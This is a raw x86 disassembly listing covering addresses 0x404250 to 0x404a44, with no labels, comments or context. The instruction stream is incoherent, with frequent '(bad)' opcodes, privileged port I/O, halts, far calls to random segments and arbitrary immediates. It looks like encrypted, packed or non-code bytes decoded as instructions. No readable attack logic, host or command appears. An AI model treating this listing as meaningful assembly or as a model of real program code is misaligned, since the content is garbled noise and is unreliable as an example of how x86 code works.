  404250:	scas   al,BYTE PTR es:[edi]
  404251:	jns    0x40428d
  404253:	mov    edx,DWORD PTR [edi]
  404255:	and    al,0xcb
  404257:	mov    dl,0x3f
  404259:	push   eax
  40425a:	add    ecx,ebp
  40425c:	mov    ecx,0x23c5b3ff
  404261:	pop    es
  404262:	push   esi
  404263:	call   0x9750:0x5a127b10
  40426a:	popa   
  40426b:	push   ss
  40426c:	add    DWORD PTR fs:[ebp-0x52be4012],edi
  404273:	jg     0x40424f
  404275:	xor    ebp,DWORD PTR [eax-0x66a3819c]
  40427b:	and    DWORD PTR [esi],ebp
  40427d:	loopne 0x404284
  40427f:	popf   
  404280:	adc    al,0xd6
  404282:	ss ret 
  404284:	hlt    
  404285:	cdq    
  404286:	ds push ds
  404288:	cmp    BYTE PTR ds:0xadb451a9,bh
  40428e:	imul   ebx,edi,0x58df54d0
  404294:	push   ds
  404295:	dec    ecx
  404296:	cld    
  404297:	repnz cwde 
  404299:	inc    esi
  40429a:	sahf   
  40429b:	jge    0x4042be
  40429d:	fcomp  DWORD PTR [edi]
  40429f:	call   0x534f:0xabd8188b
  4042a6:	mov    ebx,0xc1e8698d
  4042ab:	int    0x6c
  4042ad:	lods   eax,DWORD PTR ds:[esi]
  4042ae:	jae    0x404236
  4042b0:	sub    BYTE PTR [edx*2-0x263a0ba3],0x2b
  4042b8:	push   ss
  4042b9:	les    esi,FWORD PTR [eax-0x5b34d45c]
  4042bf:	cmp    dh,BYTE PTR [edx-0x57]
  4042c2:	inc    esi
  4042c3:	jmp    0x4042ee
  4042c5:	sub    ebp,DWORD PTR [ebp-0x1bfbc62d]
  4042cb:	lea    bx,[edi+0x3990bcd2]
  4042d2:	inc    edi
  4042d3:	push   ds
  4042d4:	in     eax,0x27
  4042d6:	xchg   edi,eax
  4042d7:	mov    eax,edi
  4042d9:	and    ebp,DWORD PTR [edx-0xa]
  4042dc:	loope  0x40430a
  4042de:	dec    edi
  4042df:	(bad)  
  4042e0:	or     eax,0x6f0a2180
  4042e5:	pop    es
  4042e6:	mov    eax,ds:0x37270016
  4042eb:	lahf   
  4042ec:	(bad)  
  4042ed:	neg    BYTE PTR [esi]
  4042ef:	lahf   
  4042f0:	arpl   WORD PTR [edx+esi*8+0xce2fcf1],bp
  4042f7:	shr    DWORD PTR [esp+ecx*4-0x1f],cl
  4042fb:	icebp  
  4042fc:	or     edx,esp
  4042fe:	lock dec esi
  404300:	mov    esi,0x231adb81
  404305:	es add al,0x5f
  404308:	adc    eax,esp
  40430a:	daa    
  40430b:	adc    BYTE PTR [ecx-0x74],ah
  40430e:	inc    edi
  40430f:	dec    ebp
  404310:	bound  ebp,QWORD PTR [eax]
  404312:	push   esp
  404313:	cwde   
  404314:	ins    DWORD PTR es:[edi],dx
  404315:	(bad)  
  404316:	cli    
  404317:	call   0x5b0a:0xab6f032c
  40431e:	add    al,0xc9
  404320:	or     eax,0xa125ae86
  404325:	cmc    
  404326:	stos   DWORD PTR es:[edi],eax
  404327:	cmp    eax,0x1ef85e9e
  40432c:	adc    ebx,ebp
  40432e:	cmp    esp,DWORD PTR [ebx+ecx*4+0x6e341049]
  404335:	hlt    
  404336:	ins    DWORD PTR es:[edi],dx
  404337:	fdivr  QWORD PTR [ebp+0x9]
  40433a:	mov    bl,0x7e
  40433c:	jg     0x4042f2
  40433e:	dec    ecx
  40433f:	and    al,0xc1
  404341:	out    0x40,eax
  404343:	nop
  404344:	jp     0x4043ba
  404346:	js     0x404305
  404348:	stc    
  404349:	(bad)  
  40434a:	push   ds
  40434b:	sub    eax,0x2d4ddf24
  404350:	inc    edx
  404351:	int    0xeb
  404353:	or     edi,DWORD PTR ds:0xc9390a7c
  404359:	jle    0x404392
  40435b:	retf   
  40435c:	and    bl,0xd4
  40435f:	adc    DWORD PTR [edi+0x10d07038],eax
  404365:	repz sub ebx,DWORD PTR [eax-0x3e]
  404369:	mov    ecx,0x529f843f
  40436e:	shr    edi,cl
  404370:	jae    0x40432b
  404372:	fs fs jb 0x4043ee
  404376:	je     0x404303
  404378:	out    0x5a,al
  40437a:	loope  0x4043bc
  40437c:	(bad)
  40437f:	push   esp
  404380:	rcl    BYTE PTR [ebx],1
  404382:	outs   dx,DWORD PTR ds:[esi]
  404383:	or     DWORD PTR [esi+eiz*2-0x44],0x9
  404388:	push   ds
  404389:	pop    edx
  40438a:	bswap  ebx
  40438c:	cdq    
  40438d:	and    al,0xcf
  40438f:	popa   
  404390:	ficom  DWORD PTR [ebx]
  404392:	stos   BYTE PTR es:[edi],al
  404393:	adc    ch,ch
  404395:	shl    BYTE PTR [ebp+eiz*4+0x6c],0xc
  40439a:	fidiv  DWORD PTR [ecx]
  40439c:	inc    esi
  40439d:	push   es
  40439e:	pop    esi
  40439f:	(bad)  
  4043a0:	sub    al,0x61
  4043a2:	mov    edi,0x8f3dc959
  4043a7:	xchg   edi,eax
  4043a8:	adc    dh,BYTE PTR [edx+ebx*1+0x2a]
  4043ac:	or     ebx,DWORD PTR [edx]
  4043ae:	in     eax,dx
  4043af:	test   BYTE PTR [eax+0x1695ae7],0x64
  4043b6:	add    cl,bh
  4043b8:	xchg   edi,eax
  4043b9:	xor    bh,dl
  4043bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043bc:	std    
  4043bd:	inc    edi
  4043be:	ror    DWORD PTR [esp+eiz*2+0x76858943],0x1d
  4043c6:	outs   dx,BYTE PTR ds:[esi]
  4043c7:	lea    edi,[edi+edi*8]
  4043ca:	sbb    bl,dh
  4043cc:	dec    ecx
  4043cd:	jge    0x4043d3
  4043cf:	or     al,0x46
  4043d1:	dec    ecx
  4043d2:	pop    edx
  4043d3:	jo     0x40444d
  4043d5:	(bad)  
  4043d6:	mov    esp,0x245d4713
  4043db:	adc    ebx,DWORD PTR [ecx-0x68fad5e9]
  4043e1:	pop    ebp
  4043e2:	stos   DWORD PTR es:[edi],eax
  4043e3:	test   eax,0x817e843d
  4043e8:	push   0x70f71c73
  4043ed:	push   cs
  4043ee:	das    
  4043ef:	mov    BYTE PTR [ecx+0x5b],dl
  4043f2:	add    dl,dl
  4043f4:	arpl   WORD PTR [ebp+0x32],ax
  4043f7:	xchg   edi,eax
  4043f8:	xor    cl,BYTE PTR [esi]
  4043fa:	jl     0x40439c
  4043fc:	hlt    
  4043fd:	mov    ah,0x42
  4043ff:	xor    DWORD PTR [ebx-0x77],ecx
  404402:	iret   
  404403:	aad    0x13
  404405:	cwde   
  404406:	and    edi,esi
  404408:	jae    0x40441b
  40440a:	sbb    al,0xac
  40440d:	dec    esi
  40440e:	cmp    eax,0x5bd5b3b8
  404413:	(bad)  
  404414:	sub    DWORD PTR [edi+0x319f5417],ebx
  40441a:	add    eax,ebx
  40441c:	mov    ds:0xbe575e54,al
  404421:	mov    esp,0x32f488c6
  404426:	and    eax,0x3f741631
  40442b:	retf   
  40442c:	or     ch,BYTE PTR [edi+0x34607d99]
  404432:	cwde   
  404433:	xor    DWORD PTR [ebx+ecx*4-0x3a],ebx
  404437:	aam    0x8
  404439:	xchg   ebx,eax
  40443a:	imul   ebx,DWORD PTR [edx],0x7
  40443d:	cmc    
  40443e:	sub    esp,ebx
  404440:	mov    DWORD PTR [ecx+0xf],esp
  404443:	mov    ds:0x387535f5,eax
  404448:	sbb    eax,DWORD PTR [ebx]
  40444a:	sti    
  40444b:	mov    eax,ds:0xde24ca10
  404450:	cmc    
  404451:	add    ecx,DWORD PTR [eax-0x25046564]
  404457:	push   0x64
  404459:	jp     0x40447c
  40445b:	push   es
  40445c:	div    bl
  40445e:	loopne 0x4043ea
  404460:	push   ebx
  404461:	clts   
  404463:	sub    ah,dl
  404465:	or     DWORD PTR [ebx+0x25ad85b7],edx
  40446b:	jl     0x4044cc
  40446d:	inc    eax
  40446e:	and    bl,BYTE PTR [ebx+eax*1-0x2e7c17f0]
  404475:	fwait
  404476:	test   DWORD PTR [ebx],0x96ba73d0
  40447c:	adc    ebx,DWORD PTR [edi+0x70]
  40447f:	iret   
  404480:	aam    0x37
  404482:	je     0x40440e
  404484:	imul   esp,edi,0xe081cfc0
  40448a:	(bad)  
  40448b:	pop    esi
  40448c:	retf   
  40448d:	mov    ebx,0x435677f6
  404492:	and    al,0x41
  404494:	push   ebx
  404495:	xor    al,0xc5
  404497:	and    esp,DWORD PTR [ecx]
  404499:	push   cs
  40449a:	out    dx,eax
  40449b:	inc    ebp
  40449c:	push   ecx
  40449d:	xchg   ebp,eax
  40449e:	sub    BYTE PTR [ebx],bh
  4044a0:	xchg   esp,eax
  4044a1:	jecxz  0x404443
  4044a3:	in     al,0xa3
  4044a5:	cli    
  4044a6:	sub    eax,0x8871d8b8
  4044ab:	or     bh,al
  4044ad:	hlt    
  4044ae:	xlat   BYTE PTR ds:[ebx]
  4044af:	add    esi,DWORD PTR ds:0x5e5b4b3d
  4044b5:	xchg   ebp,eax
  4044b6:	pop    ecx
  4044b7:	pop    ebp
  4044b8:	pop    edi
  4044b9:	sti    
  4044ba:	xchg   BYTE PTR es:[esi+eax*2-0x9],bh
  4044bf:	mov    edi,0x1846e6f5
  4044c4:	xor    edi,0x62
  4044c7:	xor    dh,ah
  4044c9:	loop   0x404534
  4044cb:	cmp    esp,DWORD PTR [ecx+0x262a2ee9]
  4044d1:	push   ebp
  4044d2:	aas    
  4044d3:	mov    gs,edx
  4044d5:	lods   eax,DWORD PTR ds:[esi]
  4044d6:	les    ebx,FWORD PTR ds:0x55ee01da
  4044dc:	in     eax,0xbc
  4044de:	xchg   DWORD PTR [ecx+esi*2],ebx
  4044e1:	in     al,dx
  4044e2:	dec    esi
  4044e3:	popf   
  4044e4:	data16 mov al,ds:0xf83b862c
  4044ea:	dec    edi
  4044eb:	mov    DWORD PTR [edx],ecx
  4044ed:	fidivr WORD PTR [eax-0x2bb10c4b]
  4044f3:	jp     0x404493
  4044f5:	out    0xb1,eax
  4044f7:	pop    ecx
  4044f8:	addr16 mov ah,0xd4
  4044fb:	js     0x40454b
  4044fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044fe:	push   ss
  4044ff:	test   ebp,0x6433f73d
  404505:	sbb    eax,esp
  404507:	js     0x404560
  404509:	xchg   ecx,eax
  40450a:	into   
  40450b:	or     esp,DWORD PTR [edx]
  40450d:	jmp    0xea2d:0xfc4a3b9c
  404514:	mov    ch,0xf6
  404516:	mov    cl,0x88
  404518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404519:	fimul  WORD PTR [ecx+esi*1+0x2e7dbc54]
  404520:	stos   BYTE PTR es:[edi],al
  404521:	sub    ch,dl
  404523:	xor    ebp,DWORD PTR [edx+ebp*2+0x70]
  404527:	jbe    0x404564
  404529:	gs in  al,0xd5
  40452c:	jmp    0x3338:0xfbaf546
  404533:	fidiv  WORD PTR fs:[ebx+0x37]
  404537:	mov    ebp,0xf244600
  40453c:	push   esp
  40453d:	dec    esp
  40453e:	imul   ebp,DWORD PTR [ebx-0x35c88d80],0x45
  404545:	jno    0x40455a
  404547:	or     BYTE PTR [ecx+0x76],ch
  40454a:	das    
  40454b:	ret    0x6abe
  40454e:	push   ecx
  40454f:	push   edi
  404550:	and    BYTE PTR [edi+ecx*1-0x25c9cc04],bl
  404557:	pop    eax
  404558:	sbb    ah,BYTE PTR [ebp+0x12]
  40455b:	in     al,dx
  40455c:	xchg   DWORD PTR [edx+ebp*8+0x41],esi
  404560:	cld    
  404561:	add    BYTE PTR [ebx-0x7beb6c05],bh
  404567:	fsubr  st,st(3)
  404569:	or     ch,BYTE PTR [edx-0x23]
  40456c:	push   0x4f
  40456e:	pop    esi
  40456f:	test   al,0xb1
  404571:	pop    es
  404572:	aas    
  404573:	in     eax,dx
  404574:	clc    
  404575:	fild   QWORD PTR [edi]
  404577:	jmp    0xb4bcbcb5
  40457c:	jns    0x40451f
  40457e:	xchg   esi,eax
  40457f:	sti    
  404580:	push   ss
  404581:	loope  0x40459b
  404583:	test   edx,eax
  404585:	adc    ebx,ebx
  404587:	jo     0x40451e
  404589:	pop    ebx
  40458a:	and    ch,BYTE PTR [esi-0x2a]
  40458d:	and    ecx,DWORD PTR [esi-0x61]
  404590:	jb     0x404560
  404592:	mov    eax,0xad5ccb69
  404597:	scas   eax,DWORD PTR es:[edi]
  404598:	repz test DWORD PTR [edx+0x3d],edx
  40459c:	and    al,0xc1
  40459e:	pop    es
  40459f:	(bad)  
  4045a0:	jne    0x40460e
  4045a2:	int    0xc7
  4045a4:	mov    eax,0x18815dc3
  4045a9:	xor    dh,ah
  4045ab:	out    0xdb,al
  4045ad:	sub    al,0x55
  4045af:	and    al,0xf0
  4045b1:	test   eax,0x81637298
  4045b6:	push   ss
  4045b7:	add    al,0xf6
  4045b9:	repnz adc DWORD PTR [eax],ebx
  4045bc:	mov    edi,0xcc9863bd
  4045c1:	bound  edi,QWORD PTR [ebp+0x69877e76]
  4045c7:	in     eax,dx
  4045c8:	outs   dx,BYTE PTR ds:[esi]
  4045c9:	dec    ecx
  4045ca:	cmp    bl,BYTE PTR [eax+0x1f]
  4045cd:	add    eax,0x67fcf700
  4045d2:	cmc    
  4045d3:	pop    ebp
  4045d4:	stos   BYTE PTR es:[edi],al
  4045d5:	inc    esp
  4045d6:	cld    
  4045d7:	rol    DWORD PTR [eax+edx*8],cl
  4045da:	pop    esp
  4045db:	push   edx
  4045dc:	popf   
  4045dd:	(bad)  
  4045de:	mov    al,dh
  4045e0:	addr16 jae 0x4045ce
  4045e3:	xor    esp,esi
  4045e5:	sbb    dl,BYTE PTR [edi+0x30]
  4045e8:	and    DWORD PTR [ecx],edx
  4045ea:	dec    esi
  4045eb:	call   0x6b35:0x6461bd9a
  4045f2:	data16 jne 0x40463e
  4045f5:	aaa    
  4045f6:	xchg   edi,eax
  4045f7:	push   esi
  4045f8:	fs sub DWORD PTR fs:[esi+0x23],edi
  4045fd:	pop    es
  4045fe:	inc    eax
  4045ff:	fcom   QWORD PTR [ebp+0x7b]
  404602:	dec    ebx
  404603:	pop    ds
  404604:	xlat   BYTE PTR ds:[ebx]
  404605:	aaa    
  404606:	ret    0xe61b
  404609:	mov    al,ds:0x932f3106
  40460e:	imul   eax,DWORD PTR [edi+0x50],0xff874c7a
  404615:	jl     0x404620
  404617:	xlat   BYTE PTR ds:[ebx]
  404618:	mov    ecx,esi
  40461a:	in     al,0xcc
  40461c:	aam    0xbe
  40461e:	xor    BYTE PTR [ebp+0x2314dd4c],bl
  404624:	jge    0x4045fd
  404626:	and    eax,0x417c49f
  40462b:	neg    BYTE PTR [eax]
  40462d:	mov    WORD PTR [ebx+0x7fef068a],ss
  404633:	paddusb mm5,QWORD PTR [edi]
  404636:	shl    esi,0x2
  404639:	adc    eax,0xff2da77a
  40463e:	fwait
  40463f:	mov    esp,0xad81111c
  404644:	sar    bh,1
  404646:	dec    eax
  404647:	loopne 0x4045f9
  404649:	ins    BYTE PTR es:[edi],dx
  40464a:	xlat   BYTE PTR ds:[ebx]
  40464b:	or     al,BYTE PTR [eax]
  40464d:	aaa    
  40464e:	jb     0x4045f0
  404650:	dec    edi
  404651:	sahf   
  404652:	add    al,0xd6
  404654:	out    0xf4,al
  404656:	and    eax,DWORD PTR [ecx+edx*1]
  404659:	mov    dl,0xb3
  40465b:	popa   
  40465c:	(bad)
  40465f:	cmp    DWORD PTR [esp+ebp*4],ebp
  404662:	push   ebx
  404663:	push   ss
  404664:	aad    0xdc
  404666:	xor    BYTE PTR gs:[esi-0x7ff80f38],0x4b
  40466e:	aam    0x93
  404670:	and    dh,BYTE PTR [ebx-0x2e4e7ada]
  404676:	jae    0x404610
  404678:	push   ds
  404679:	xchg   DWORD PTR [edx+esi*1],edx
  40467c:	xor    DWORD PTR [ebx+edx*8+0x4a1c0e15],ecx
  404683:	loope  0x40460a
  404685:	jnp    0x404662
  404687:	pop    ebx
  404688:	ja     0x4046c7
  40468a:	scas   eax,DWORD PTR es:[edi]
  40468b:	fcmovnbe st,st(1)
  40468d:	not    BYTE PTR [esi]
  40468f:	and    eax,0xdc00a772
  404694:	sar    DWORD PTR [ecx+0x2a],0xca
  404698:	jge    0x404679
  40469a:	dec    eax
  40469b:	dec    edx
  40469c:	inc    edx
  40469d:	fist   WORD PTR [edi-0x4f69e3fc]
  4046a3:	sbb    al,0x98
  4046a5:	pop    es
  4046a6:	clc    
  4046a7:	mov    bh,0xfc
  4046a9:	mov    eax,ds:0x95d29cfc
  4046ae:	adc    ebx,0xffffffd1
  4046b1:	mov    esp,DWORD PTR [edi]
  4046b3:	dec    esi
  4046b4:	mov    ecx,0x82a490b3
  4046b9:	out    dx,al
  4046ba:	mov    al,0x95
  4046bc:	sub    eax,0xbda73a1f
  4046c1:	js     0x4046d8
  4046c3:	jg     0x4046c9
  4046c5:	repz jbe 0x404690
  4046c8:	je     0x40465f
  4046ca:	out    dx,eax
  4046cb:	daa    
  4046cc:	or     eax,0x50e9fee2
  4046d1:	pop    eax
  4046d2:	inc    esi
  4046d3:	lods   eax,DWORD PTR ds:[esi]
  4046d4:	jle    0x404682
  4046d6:	push   ebx
  4046d7:	inc    edx
  4046d8:	xor    ch,BYTE PTR [edi+0x79ead712]
  4046de:	stos   DWORD PTR es:[edi],eax
  4046df:	mov    bl,0x5
  4046e1:	jle    0x404749
  4046e3:	xor    bh,BYTE PTR [ebx+0x7c58fdd4]
  4046e9:	ficomp DWORD PTR [eax-0x3d3aa80e]
  4046ef:	cmc    
  4046f0:	sbb    DWORD PTR [bp+di],esi
  4046f3:	sahf   
  4046f4:	dec    edi
  4046f5:	cli    
  4046f6:	push   ebx
  4046f7:	aas    
  4046f8:	cwde   
  4046f9:	mov    eax,0x50aea2b
  4046fe:	mov    ch,0x74
  404700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404701:	fnstenv [esi+0x4c]
  404704:	jno    0x40473c
  404706:	and    BYTE PTR [ebp-0x2d],dl
  404709:	fcom   QWORD PTR [edx+0x1b]
  40470c:	shl    DWORD PTR [edi],0xb
  40470f:	in     eax,dx
  404710:	outs   dx,DWORD PTR ds:[esi]
  404711:	std    
  404712:	mul    BYTE PTR [ecx]
  404714:	jl     0x404771
  404716:	fucomp st(1)
  404718:	xchg   edx,eax
  404719:	rcr    DWORD PTR [ebp+0x30],0xbe
  40471d:	daa    
  40471e:	jae    0x404797
  404720:	xchg   DWORD PTR [edx+edx*1+0x48],eax
  404724:	jae    0x404785
  404726:	add    DWORD PTR [eax],ecx
  404728:	jge    0x4046de
  40472a:	(bad)  [ecx+0x7]
  40472d:	daa    
  40472e:	mov    edi,0xa0179910
  404733:	sbb    eax,0x14525c47
  404738:	jnp    0x4046c8
  40473a:	icebp  
  40473b:	dec    esp
  40473c:	sahf   
  40473d:	outs   dx,DWORD PTR ds:[esi]
  40473e:	jle    0x4047a0
  404740:	test   DWORD PTR [eax+0xaa35bb7],ebx
  404746:	cmp    ecx,DWORD PTR ds:0xe887d642
  40474c:	jp     0x40472d
  40474e:	rcl    DWORD PTR [edi-0x39daa308],cl
  404754:	or     al,BYTE PTR [esi-0x6a18eafc]
  40475a:	pop    ecx
  40475b:	xchg   ebp,eax
  40475c:	add    eax,0x670dc56f
  404761:	dec    ebp
  404762:	mov    BYTE PTR [esi],0x77
  404765:	or     edx,DWORD PTR [ecx]
  404767:	mov    ebx,0x49f692a8
  40476c:	pop    ds
  40476d:	pop    ebx
  40476e:	xchg   DWORD PTR [ecx-0x3f],eax
  404771:	ret    
  404772:	sbb    BYTE PTR [edi-0x425b4017],cl
  404778:	push   ebx
  404779:	mov    cl,0x74
  40477b:	jne    0x4047cc
  40477d:	das    
  40477e:	(bad)  
  40477f:	cmp    DWORD PTR [ecx],ecx
  404781:	lea    esi,[esi]
  404783:	push   ds
  404784:	aas    
  404785:	mov    esi,0x2028177
  40478a:	mov    ebx,0xc204117c
  40478f:	xchg   esp,eax
  404790:	lods   eax,DWORD PTR ds:[esi]
  404791:	mov    dl,0xdf
  404793:	mov    ah,0x6d
  404795:	mov    esp,DWORD PTR [eax]
  404797:	xchg   ecx,eax
  404798:	sub    bl,BYTE PTR [edi]
  40479a:	mov    WORD PTR [ebx+0xd],gs
  40479d:	test   DWORD PTR [eax],ebp
  40479f:	xchg   edx,eax
  4047a0:	mov    ds:0x4ab1114f,al
  4047a5:	aam    0xe2
  4047a7:	push   edi
  4047a8:	fwait
  4047a9:	jg     0x404826
  4047ab:	dec    eax
  4047ac:	in     al,0x82
  4047ae:	cs push cs
  4047b0:	xor    eax,0x9471cb7d
  4047b5:	inc    esi
  4047b6:	sub    dh,BYTE PTR [ecx-0xb]
  4047b9:	jbe    0x404803
  4047bb:	add    edx,DWORD PTR [esi]
  4047bd:	ret    
  4047be:	mov    ecx,0xa0d00a3e
  4047c3:	mov    ch,0xd7
  4047c5:	add    cl,BYTE PTR [esi+0x4ae09a06]
  4047cb:	inc    edx
  4047cc:	mov    ch,0x91
  4047ce:	leave  
  4047cf:	scas   al,BYTE PTR es:[edi]
  4047d0:	jmp    0x2ebb:0xdd973c8f
  4047d7:	inc    edx
  4047d8:	or     al,0x35
  4047da:	adc    bl,BYTE PTR [eax]
  4047dc:	data16 xchg dl,ch
  4047df:	sub    eax,0x21a940e8
  4047e4:	mov    ds:0x4240e8b5,eax
  4047e9:	pop    esi
  4047ea:	nop
  4047eb:	mov    ?,WORD PTR [eax+0x3a]
  4047ee:	fisttp DWORD PTR [edx]
  4047f0:	xchg   edx,eax
  4047f1:	sub    dl,cl
  4047f3:	call   0xf47f:0x538a12a8
  4047fa:	push   cs
  4047fb:	popa   
  4047fc:	add    BYTE PTR [eax+0x2b],bl
  4047ff:	xor    ebx,DWORD PTR [ebp+0x647a1a52]
  404805:	push   0x1143b63f
  40480a:	or     ah,BYTE PTR [eax+0x3]
  40480d:	mov    dh,0xfa
  40480f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404810:	or     esp,ebp
  404812:	xchg   ebx,eax
  404813:	pop    edx
  404814:	cmp    DWORD PTR [ecx+0x3a],esi
  404817:	lods   al,BYTE PTR ds:[esi]
  404818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404819:	dec    ebx
  40481a:	fidivr DWORD PTR [eax+0x40be0217]
  404820:	push   ds
  404821:	pop    ebp
  404822:	fwait
  404823:	mov    DWORD PTR [ecx+0x70],0x1fa02acf
  40482a:	xchg   sp,ax
  40482c:	mov    edi,0x63b84d2
  404831:	sbb    ebx,ebx
  404833:	sahf   
  404834:	jo     0x404839
  404836:	mov    cl,0xdd
  404839:	std    
  40483a:	add    al,0x5e
  40483c:	(bad)  
  40483d:	or     al,0xaf
  40483f:	into   
  404840:	jl     0x4048ae
  404842:	pop    esp
  404843:	pusha  
  404844:	mov    eax,0xf94fc85a
  404849:	arpl   WORD PTR [ebx+eiz*8+0x50f9a25d],sp
  404850:	jae    0x404838
  404852:	cmp    DWORD PTR [ecx],edx
  404854:	push   ebx
  404855:	mov    eax,0x2ba311d8
  40485a:	cmp    edx,DWORD PTR [eax]
  40485c:	push   0x87fd6caa
  404861:	adc    al,BYTE PTR [ebp-0x65]
  404864:	js     0x40487f
  404866:	mov    ecx,0xe7bbaa6d
  40486b:	xchg   ebp,eax
  40486c:	sub    DWORD PTR [esi-0x66bfb6b0],ebx
  404872:	fcomp  DWORD PTR [ecx]
  404874:	cmp    al,0xf1
  404876:	pop    es
  404877:	outs   dx,DWORD PTR gs:[esi]
  404879:	push   edi
  40487a:	adc    al,0x20
  40487c:	outs   dx,BYTE PTR ds:[esi]
  40487d:	fs cs push 0x1015c441
  404884:	cs into 
  404886:	pop    esi
  404887:	xlat   BYTE PTR ds:[ebx]
  404888:	js     0x40483c
  40488a:	in     eax,0x81
  40488c:	es sbb eax,0xb292d28c
  404892:	adc    DWORD PTR [ebp-0x18],ebp
  404895:	cmp    esp,DWORD PTR [edx-0x65]
  404898:	xchg   esp,eax
  404899:	shl    DWORD PTR [esi+0x18],1
  40489c:	scas   al,BYTE PTR es:[edi]
  40489d:	dec    esi
  40489e:	pop    edx
  40489f:	sub    al,BYTE PTR [edi-0x77e1dbcb]
  4048a5:	jp     0x40485d
  4048a7:	jmp    0x404856
  4048a9:	push   0xffffffe7
  4048ab:	es mov ebp,0x2b9ce35c
  4048b1:	mov    ebx,0x8594a1f7
  4048b6:	paddusw mm4,mm7
  4048b9:	jmp    0xf9d2:0x1bb9c7dc
  4048c0:	and    eax,0x62011a10
  4048c5:	xchg   BYTE PTR [eax-0x22],bh
  4048c8:	lea    esp,[eax+ebx*2]
  4048cb:	sbb    bh,dl
  4048cd:	cs mov edi,0x7069405b
  4048d3:	dec    ebp
  4048d4:	push   ecx
  4048d5:	enter  0xec40,0x1b
  4048d9:	adc    dl,dl
  4048db:	push   es
  4048dc:	std    
  4048dd:	jmp    0x4048d2
  4048df:	adc    BYTE PTR [edx+ebx*8],0x23
  4048e3:	lock cmp ebx,DWORD PTR [esi+0x661b219a]
  4048ea:	into   
  4048eb:	push   cs
  4048ec:	mov    ebp,0x3c4f57db
  4048f1:	push   edi
  4048f2:	pop    ecx
  4048f3:	outs   dx,BYTE PTR cs:[esi]
  4048f5:	add    DWORD PTR [esi],0xf445622f
  4048fb:	les    esp,FWORD PTR [ecx+ebx*4]
  4048fe:	push   0x35343656
  404903:	lahf   
  404904:	shr    BYTE PTR [esi],cl
  404906:	out    0x54,al
  404908:	mov    eax,ds:0x7fe339d0
  40490d:	test   eax,0x228fd22c
  404912:	push   ebp
  404913:	sub    eax,0xe5e91542
  404918:	icebp  
  404919:	ins    BYTE PTR es:[edi],dx
  40491a:	out    0x19,eax
  40491c:	test   eax,0x81e72f91
  404921:	mov    eax,ds:0x3b93a0d6
  404926:	int    0xf4
  404928:	dec    ebp
  404929:	(bad)  
  40492b:	sub    bh,BYTE PTR [ecx-0x2f]
  40492e:	and    al,0x15
  404930:	popf   
  404931:	out    0xff,al
  404933:	outs   dx,BYTE PTR ds:[esi]
  404934:	and    esp,DWORD PTR [edi-0x6e]
  404937:	add    al,0x1
  404939:	adc    esi,DWORD PTR [edi-0xb]
  40493c:	pop    ss
  40493d:	addr16 push ds
  40493f:	pusha  
  404940:	enter  0x48a6,0x95
  404944:	or     cl,BYTE PTR [eax+0x138f665b]
  40494a:	mov    edi,0x92110d37
  40494f:	out    0x48,eax
  404951:	jmp    0xfb2d:0xfa1208c0
  404958:	mov    ds,WORD PTR [ecx]
  40495a:	sub    bl,0x9b
  40495d:	inc    esi
  40495e:	add    ecx,DWORD PTR [ebp+0x75]
  404961:	xchg   BYTE PTR [edi+0x65090795],bl
  404967:	rcl    BYTE PTR [ecx],1
  404969:	jae    0x404932
  40496b:	and    edi,DWORD PTR [ebx]
  40496d:	sub    eax,0x5f6382ab
  404972:	ss and eax,0x7da103fe
  404978:	jmp    ebx
  40497a:	das    
  40497b:	in     al,dx
  40497c:	js     0x40496f
  40497e:	ja     0x4049e0
  404980:	pop    edi
  404981:	lods   al,BYTE PTR ds:[esi]
  404982:	mov    esp,0xb5b60ddc
  404987:	int    0xbf
  404989:	jmp    0x3f2f:0x91b3bd9
  404990:	jne    0x40495a
  404992:	inc    ebp
  404993:	pusha  
  404994:	jmp    0xe2e32fd5
  404999:	push   0xffffffa0
  40499b:	fist   DWORD PTR [edi+edx*4]
  40499e:	jle    0x4049ab
  4049a0:	adc    eax,edi
  4049a2:	(bad)  
  4049a3:	in     al,dx
  4049a4:	inc    edi
  4049a5:	pop    edx
  4049a6:	sub    ecx,0x58e8b1a7
  4049ac:	adc    DWORD PTR [esi],esp
  4049ae:	adc    al,0x5e
  4049b0:	aas    
  4049b1:	outs   dx,BYTE PTR ds:[esi]
  4049b2:	mov    al,ds:0x128c6592
  4049b7:	mov    esi,0x8e00b1ac
  4049bc:	push   ecx
  4049bd:	mov    eax,0xdea69a00
  4049c2:	and    ch,BYTE PTR [esi]
  4049c4:	in     eax,dx
  4049c5:	sub    al,0x41
  4049c7:	gs xor eax,0x24bedbf4
  4049cd:	int    0x28
  4049cf:	xlat   BYTE PTR ds:[ebx]
  4049d0:	repnz sub al,0x11
  4049d3:	add    BYTE PTR [eax+ebx*8-0x466bc735],dh
  4049da:	repz in al,dx
  4049dc:	(bad)  
  4049dd:	pop    ebx
  4049de:	pushf  
  4049df:	jns    0x404a28
  4049e1:	mov    WORD PTR [edi-0x2e],es
  4049e4:	mov    esi,0x22137008
  4049e9:	fild   WORD PTR [eax+0x5a]
  4049ec:	push   eax
  4049ed:	repz inc ecx
  4049ef:	sbb    ch,al
  4049f1:	mov    dh,0x2
  4049f3:	push   edx
  4049f4:	sub    ch,bh
  4049f6:	psllq  mm1,mm0
  4049f9:	xor    ebx,DWORD PTR [ebp+0x14]
  4049fc:	push   0xffffffad
  4049fe:	pop    esp
  4049ff:	loope  0x404a60
  404a01:	pop    esi
  404a02:	sub    ebx,DWORD PTR [edi+0x27306461]
  404a08:	or     BYTE PTR ds:0xf36c9218,ah
  404a0e:	in     eax,0xaa
  404a10:	test   al,0xb5
  404a12:	mov    esp,0xa72b269e
  404a17:	xchg   ebx,eax
  404a18:	push   esi
  404a19:	test   eax,0x8701cdaa
  404a1e:	mov    BYTE PTR [ebx-0x116d4ef2],bl
  404a24:	vmwrite edx,DWORD PTR [esi+0x1a]
  404a28:	mov    cl,0x31
  404a2a:	aad    0x98
  404a2c:	das    
  404a2d:	and    BYTE PTR [ebx-0x6d],dl
  404a30:	mov    edx,0xe17d8927
  404a35:	out    0xbe,eax
  404a37:	and    ebx,eax
  404a39:	sub    cl,BYTE PTR [ecx+0x2b729672]
  404a3f:	inc    edi
  404a40:	clc    
  404a41:	pop    ebp
  404a42:	add    al,0xf
  404a44:	mov    ecx,0xb94c1fb4
